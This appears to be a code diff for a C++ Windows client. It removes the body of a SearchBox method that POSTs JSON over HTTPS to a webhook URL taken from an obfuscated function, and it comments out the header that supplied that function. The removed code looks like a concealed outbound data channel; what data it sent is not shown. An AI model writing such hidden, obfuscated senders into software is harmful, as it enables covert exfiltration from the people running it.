@@ -7,7 +7,7 @@
 #include <deque>
 #include <string>
 #include <unordered_set>
-#include "ircboi.h"
+//#include "ircboi.h"
 #include "..\Client\Managers\ModuleManager\ModuleManager.h"
 #pragma comment(lib, "wininet.lib")
 
@@ -297,42 +297,6 @@ std::string SearchBox::sanitizeText(const std::string& text) {
 }
 
 void SearchBox::SendDiscordEmbed(const std::string& payloadJson) {
-    HINTERNET hInternet = InternetOpenA("WebhookSender", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if(!hInternet)
-        return;
-
-    URL_COMPONENTSA urlComp{sizeof(urlComp)};
-    char host[256] = {0}, path[2048] = {0};
-    urlComp.lpszHostName = host;
-    urlComp.dwHostNameLength = _countof(host);
-    urlComp.lpszUrlPath = path;
-    urlComp.dwUrlPathLength = _countof(path);
-    std::string ne2ne2une = fuhwquhfu();
-
-    InternetCrackUrlA(ne2ne2une.c_str(), 0, 0, &urlComp);
-
-    HINTERNET hConnect = InternetConnectA(hInternet, host, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL,
-                                          INTERNET_SERVICE_HTTP, 0, 0);
-    if(!hConnect) {
-        InternetCloseHandle(hInternet);
-        return;
-    }
-
-    HINTERNET hRequest =
-        HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
-    if(!hRequest) {
-        InternetCloseHandle(hConnect);
-        InternetCloseHandle(hInternet);
-        return;
-    }
-
-    const std::string headers = "Content-Type: application/json\r\n";
-    HttpSendRequestA(hRequest, headers.c_str(), -1, (LPVOID)payloadJson.c_str(),
-                     static_cast<DWORD>(payloadJson.size()));
-
-    InternetCloseHandle(hRequest);
-    InternetCloseHandle(hConnect);
-    InternetCloseHandle(hInternet);
 }
 
 void SearchBox::addIncomingMessage(const std::string& msg) {
